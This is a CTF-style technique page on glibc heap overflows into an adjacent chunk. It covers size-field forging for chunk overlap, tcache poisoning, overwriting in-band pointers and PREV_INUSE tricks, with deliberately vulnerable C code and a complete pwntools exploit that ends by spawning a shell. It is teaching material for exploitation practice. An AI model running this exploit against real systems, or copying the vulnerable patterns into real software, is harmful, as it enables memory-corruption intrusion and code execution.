---
title: "Heap Overflow Into the Adjacent Chunk - Metadata and Pointers"
category: pwn
subcategory: heap
type: technique
tags: [heap-overflow, adjacent-chunk, chunk-overlap, size-field, tcache, fastbin, uaf, function-pointer, vtable, prev-inuse, pwndbg, gef, pwntools, one-gadget, glibc]
difficulty: medium
summary: "Write past the end of one chunk to smash the next chunk's size, its bin pointers, or an in-band application pointer - the most direct route to chunk overlap."
when_to_use:
  - "`sz[i]` is stale after a realloc/edit, so edit() writes more bytes than the chunk holds"
  - "A fixed-size read into a variable-size allocation"
  - "You want to grow a chunk's size field so a later free swallows the chunk behind it"
  - "The next chunk is already in tcache/fastbin and you want to poison its fd"
tools: [pwntools, pwndbg, gef, one-gadget]
related: [heap-off-by-one-null-byte, heap-tcache-poisoning, heap-fake-chunk, heap-internals-primer, house-einherjar]
---

## TL;DR

A linear heap overflow reaches three things in the neighbour chunk: its `size` field
(grow it so a later free/malloc swallows more memory -> overlap), its `fd`/`bk`
(if it is already freed -> instant tcache/fastbin poisoning), and any in-band
application data such as a `char *name` or a callback pointer. Growing the size is the
most general primitive because it turns a bounded overflow into an unbounded one.

## Recognise it

- `edit()` uses a size stored separately from the real allocation, and one path updates
  the pointer but not the size (`realloc` shrink, "rename" reusing an old length).
- `read(0, ptr[i], 0x100)` with `ptr[i] = malloc(user_size)`.
- A struct with a fixed inline buffer followed by a pointer, and a `memcpy` whose length
  comes from the input.
- `strcpy`/`sprintf` into a heap buffer.
- Decompiler shows the write length and the malloc length coming from different variables.

## Vulnerable code shape

```c
struct note {
    char  title[0x18];
    void (*print)(struct note *);   /* in-band function pointer */
    char *body;                     /* in-band heap pointer     */
};

void do_edit(void) {
    int i = read_idx();
    /* BUG: the read length is the ORIGINAL size, but the chunk was reallocated
       smaller on a previous 'shrink' operation. */
    read(0, ptr[i], sz[i]);
}

void do_shrink(void) {
    int i = read_idx();
    size_t n = read_size();
    ptr[i] = realloc(ptr[i], n);    /* sz[i] not updated -> overflow next time */
}

/* the blunt version */
void do_set_name(void) {
    int i = read_idx();
    char buf[0x200];
    read(0, buf, 0x200);
    strcpy(ptr[i], buf);            /* unbounded */
}
```

## Theory

Targets: glibc 2.23 - 2.39.

The neighbour chunk begins at `user_ptr + usable_size`. The first two qwords there are
`prev_size` and `size`; after that come `fd`, `bk`, and then user data.

### 1. Growing the size field -> chunk overlap

If `B` follows `A`, set `B->size` from `0x91` to `0x131` (covering `B` and `C`).
Then `free(B)` puts a 0x130 chunk in the unsorted bin even though `C` is live.
A later `malloc(0x120)` returns that chunk, and its user area covers all of `C`.

The checks you must satisfy:

```c
/* _int_free, non-fastbin path */
if (__builtin_expect (chunk_at_offset (p, size)->size <= 2 * SIZE_SZ, 0)
    || __builtin_expect (chunksize (chunk_at_offset (p, size)) >= av->system_mem, 0))
  malloc_printerr ("free(): invalid next size (normal)");
```

So `B + new_size` must hold a plausible size: `> 0x10` and `< av->system_mem`
(usually 0x21000 for a fresh heap). If the forged size runs into the middle of a live
chunk, write a fake header there yourself.

Also, after consolidation the allocator checks the *next-next* chunk's `PREV_INUSE`, so
keep a valid chunk behind your forged region.

### 2. Shrinking the size field

Set `B->size` from 0x131 to 0x91. Free it: a 0x90 chunk goes into the bin but the
program still owns the full 0x130 region. Allocate 0x88 twice and the second allocation
lands *inside* the region the program still uses. This is the cleaner overlap because
nothing needs to consolidate.

Constraint: the byte at `B + new_size + 8` must be a plausible size - which is inside
`B`'s own user data, so you just write it.

### 3. Poisoning a freed neighbour

If `B` is already in tcache when you overflow `A`, `B + 0x10` is `B->next`:

```
payload = b"A" * usable_size_of_A      # fill A
        + p64(0)                       # B->prev_size
        + p64(0x91)                    # B->size, unchanged
        + p64(TARGET)                  # B->next   <- poison
        + p64(0)                       # B->key    <- disarm double-free detector
```

That is `heap-tcache-poisoning` with no UAF required. On 2.32+ mangle `TARGET`.

### 4. In-band application pointers

If the object stores a `char *body` or a function pointer, overwriting it is strictly
easier than any metadata game: point `body` at `__free_hook` and use the program's own
"edit body" feature as an arbitrary write, or point the callback at `system`.
Always check for this before doing heap surgery.

### 5. `PREV_INUSE` games

Clearing `B->size & 1` while writing a matching `prev_size` at `B->prev_size` makes
`free(B)` consolidate backwards into `A` - but `A` is live. The result is a free chunk
that overlaps `A`, i.e. the same primitive from the other direction. `unlink_chunk`
requires `A` to have sane `fd`/`bk`, so you must forge those in `A`'s user data
(`fd->bk == A && bk->fd == A`). Classic trick: point `fd`/`bk` at a global array slot
holding a pointer to `A`.

## Attack

glibc 2.31, overflow from `A` into `B`, goal: overlap `C` and poison a tcache fd.

1. `alloc(0, 0x88)` -> `A`
2. `alloc(1, 0x88)` -> `B`
3. `alloc(2, 0x88)` -> `C`
4. `alloc(3, 0x18)` -> guard
5. `overflow(0, b"A"*0x88 + p64(0) + p64(0x121))` - `B->size` grows from 0x91 to 0x121
   (covering `B` 0x90 + `C` 0x90 = 0x120).
6. `free(1)` - a 0x120 chunk goes to tcache[16]. `C` is inside it but still live.
7. `alloc(4, 0x118)` - returns the merged chunk. Its user data covers `C`'s header.
8. `free(2)` - `C` goes into tcache[7].
9. `edit(4, b"\x00"*0x88 + p64(0) + p64(0x91) + p64(TARGET) + p64(0))` -
   rewrite `C`'s `next` (and clear `key`).
10. `alloc(5, 0x88)` - consumes `C`.
11. `alloc(6, 0x88, payload)` - lands on `TARGET`.

## Heap state

```text
initial

  +0x000 A  size 0x91   user = ptr[0]
  +0x090 B  size 0x91   user = ptr[1]
  +0x120 C  size 0x91   user = ptr[2]
  +0x1b0 G  size 0x21
  +0x1d0 top


after step 5 (overflow from A rewrote B's header)

  +0x000 A  size 0x91
  +0x090 B  size 0x121  <-- forged: now claims to cover B and C
  +0x120 C  size 0x91   (still live, program holds ptr[2])
  +0x1b0 G  size 0x21   <-- free() checks THIS as "next chunk": 0x21 is plausible
                            (B + 0x120 = 0x1b0)  OK


after step 6-7

  tcache[16] had B(0x120); malloc(0x118) takes it back:
  +0x090 chunk4 user spans 0x0a0 .. 0x1b0
                       ^^^^^ includes C's header at +0x120 and C's data at +0x130


after step 8-9 (C freed, then rewritten through chunk4)

  C: +0x120 prev_size  (ours)
     +0x128 size 0x91  (we restored it)
     +0x130 next = TARGET      <-- poisoned through the overlap
     +0x138 key  = 0

  tcache[7]: C -> TARGET
```

## Exploit

```python
#!/usr/bin/env python3
"""Heap overflow into the adjacent chunk: grow a size to create an overlap,
then poison the overlapped chunk's tcache fd.

Target: glibc 2.27 - 2.31 (raw tcache next). For 2.32+ wrap TARGET in mangle().

Usage:
    ./exploit.py
    ./exploit.py SAFELINK          # apply PROTECT_PTR to the poison
    ./exploit.py REMOTE HOST=1.2.3.4 PORT=1337
"""
from pwn import ELF, args, context, log, p64, process, remote, u64

BINARY = args.BIN or "./chal"
LIBC = args.LIBC or "./libc.so.6"

context.binary = ELF(BINARY, checksec=False)
context.log_level = args.LOG or "info"
libc = ELF(LIBC, checksec=False)

S = 0x88          # request -> 0x90 chunk
MERGED = 0x118    # request -> 0x120 chunk (covers B + C)

io = (remote(args.HOST or "127.0.0.1", int(args.PORT or 1337))
      if args.REMOTE else process([BINARY]))


def menu(c):
    io.sendlineafter(b"> ", str(c).encode())


def alloc(i, n, d=b"A"):
    menu(1)
    io.sendlineafter(b"index: ", str(i).encode())
    io.sendlineafter(b"size: ", str(n).encode())
    io.sendafter(b"content: ", d)


def free(i):
    menu(2)
    io.sendlineafter(b"index: ", str(i).encode())


def show(i):
    menu(3)
    io.sendlineafter(b"index: ", str(i).encode())
    io.recvuntil(b"content: ")
    return io.recvline().rstrip(b"\n")


def edit(i, d):
    """The overflowing edit: writes len(d) bytes regardless of the chunk size."""
    menu(4)
    io.sendlineafter(b"index: ", str(i).encode())
    io.sendlineafter(b"length: ", str(len(d)).encode())
    io.sendafter(b"content: ", d)


def lk(raw):
    return u64(raw.ljust(8, b"\x00")[:8])


def mangle(pos, ptr):
    return (pos >> 12) ^ ptr


# ------------------------------------------------------------------- leaks
alloc(10, 0x418, b"leaker")
alloc(11, 0x18, b"guard0")
free(10)
libc.address = lk(show(10)) - 0x60 - libc.sym["main_arena"]
log.success("libc base = %#x", libc.address)
TARGET = libc.sym["__free_hook"] if "__free_hook" in libc.sym \
    else libc.sym["_IO_2_1_stdout_"]

heap_hint = 0
if args.SAFELINK:
    alloc(12, 0x28, b"h")
    free(12)
    heap_hint = lk(show(12)) << 12          # lone-entry leak: (pos >> 12)
    log.success("heap page = %#x", heap_hint)

# ------------------------------------------------------------------ layout
alloc(0, S, b"A" * 8)     # A - the overflow source
alloc(1, S, b"B" * 8)     # B - the chunk whose size we grow
alloc(2, S, b"C" * 8)     # C - the chunk we will overlap
alloc(3, 0x18, b"guard")  # keeps the region off the top chunk

# ------------------------------------------- 1. grow B's size to swallow C
payload = b"A" * S                  # fill A's usable 0x88 bytes
payload += p64(0)                   # B->prev_size
payload += p64(0x121)               # B->size : 0x90 (B) + 0x90 (C) + PREV_INUSE
edit(0, payload)
log.info("B->size forged to 0x121")

# ------------------------------------------------- 2. free B, reclaim big
free(1)                             # a 0x120 chunk enters tcache[16]
alloc(4, MERGED, b"overlap")        # returns it; user data covers C's header

# ------------------------------------------------- 3. free C, poison via 4
free(2)                             # C -> tcache[7]

poison = TARGET
if args.SAFELINK:
    # C's user address = heap_page + offset of C's user area. Derive it from the
    # debugger once and keep it as a constant for the challenge.
    C_USER_OFF = 0x370              # adjust after `vis_heap_chunks`
    poison = mangle(heap_hint + C_USER_OFF, TARGET)

payload = b"\x00" * S               # chunk4's first 0x88 bytes = B's old data
payload += p64(0)                   # C->prev_size
payload += p64(0x91)                # C->size, restored so tcache_get is happy
payload += p64(poison)              # C->next  -> TARGET
payload += p64(0)                   # C->key   -> disarm the double-free detector
edit(4, payload)
log.info("tcache[7] head -> %#x", TARGET)

# ------------------------------------------------------------ 4. cash out
alloc(5, S, b"consume C")
alloc(6, S, p64(libc.sym["system"]))
log.success("write landed at %#x", TARGET)

alloc(7, 0x18, b"/bin/sh\x00")
free(7)
io.interactive()
```

## Variants & pitfalls

- **`free(): invalid next size (normal)`** - your forged size points at garbage.
  Compute `B + new_size` and make sure a sane size field lives there (write one).
- **`malloc(): memory corruption`** - the unsorted/small bin walk found an
  inconsistent chunk. Usually the forged size is not 0x10-aligned, or `PREV_INUSE`
  was dropped.
- **Shrink instead of grow when you can.** Shrinking needs no external fake header and
  is far less likely to trip a check.
- **Filling the gap.** `read()` may stop at a newline; use `send` not `sendline`, and
  prefer `sendafter` so pwntools does not add anything.
- **Alignment of the overflow.** If the request was `0x80` (usable 0x88 still), the
  first byte past `user + 0x80` is the last 8 bytes of your own chunk, not the
  neighbour's `prev_size`. Compute `usable = chunksize - 8`.
- **In-band pointers first.** If the struct holds `char *body`, overwriting it is a
  one-step arbitrary read/write with the program's own menu. Always check.
- **2.32+**: any `fd`/`next` you write must be mangled, so you need a heap leak first.
- **Top chunk.** Overflowing into the top chunk's size is `house-force` (dead on 2.29+)
  or `house-orange` (2.23).

## Debugging

```text
pwndbg> vis_heap_chunks 24        # see the forged size immediately
pwndbg> x/6gx <B_chunk>
pwndbg> try_free <B_chunk>        # will the free pass? which check fails?
pwndbg> bins
pwndbg> p av->system_mem          # the upper bound on a plausible next size
pwndbg> p main_arena.system_mem
pwndbg> heap -v
gef>  heap chunks
gef>  heap-analysis-helper
```

```bash
# Find the overflow: compare the malloc length and the read length in the decompiler,
# or catch it at runtime.
ltrace -e 'malloc+read' ./chal 2>&1 | head -40
```

## Tools

- `pwndbg vis_heap_chunks` / `try_free`.
- `gef heap chunks`.
- `one_gadget`, `seccomp-tools`.

## References

- CTF Wiki, "Heap Overflow" chapter.
- shellphish `how2heap`: `overlapping_chunks.c`, `overlapping_chunks_2.c`.
- glibc `malloc/malloc.c`: `_int_free` size validation.
